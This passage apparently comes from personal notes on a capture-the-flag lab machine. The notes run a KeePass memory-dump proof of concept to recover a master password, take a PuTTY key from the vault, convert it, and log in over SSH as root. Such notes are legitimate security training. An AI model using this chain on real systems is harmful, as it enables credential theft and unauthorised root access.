@@ -1,0 +1,33 @@
+Try : https://github.com/matro7sh/keepass-dump-masterkey
+
+lnorgaard@keeper:~$ python3 poc.py KeePassDumpFull.dmp
+2023-12-26 10:33:30,396 [.] [main] Opened KeePassDumpFull.dmp
+Possible password: ●,dgr●d med fl●de
+Possible password: ●ldgr●d med fl●de
+Possible password: ●`dgr●d med fl●de
+Possible password: ●-dgr●d med fl●de
+Possible password: ●'dgr●d med fl●de
+Possible password: ●]dgr●d med fl●de
+Possible password: ●Adgr●d med fl●de
+Possible password: ●Idgr●d med fl●de
+Possible password: ●:dgr●d med fl●de
+Possible password: ●=dgr●d med fl●de
+Possible password: ●_dgr●d med fl●de
+Possible password: ●cdgr●d med fl●de
+Possible password: ●Mdgr●d med fl●de
+
+google it u will see it may mean : rødgrød med fløde
+
+
+Try to download passcodes.kdbx
+
+Save the Putty keys in ppk https://askubuntu.com/questions/15378/how-do-i-install-an-ssh-private-key-generated-by-puttygen/15402#15402
+
+┌──(root㉿N1NJ10)-[~/HTB]
+└─# puttygen Putty_key.ppk -O private-openssh -o keeper.pem
+
+
+┌──(root㉿N1NJ10)-[~/HTB/easy_trash]
+└─# ssh -i keeper.pem root@10.10.11.227
+
+   
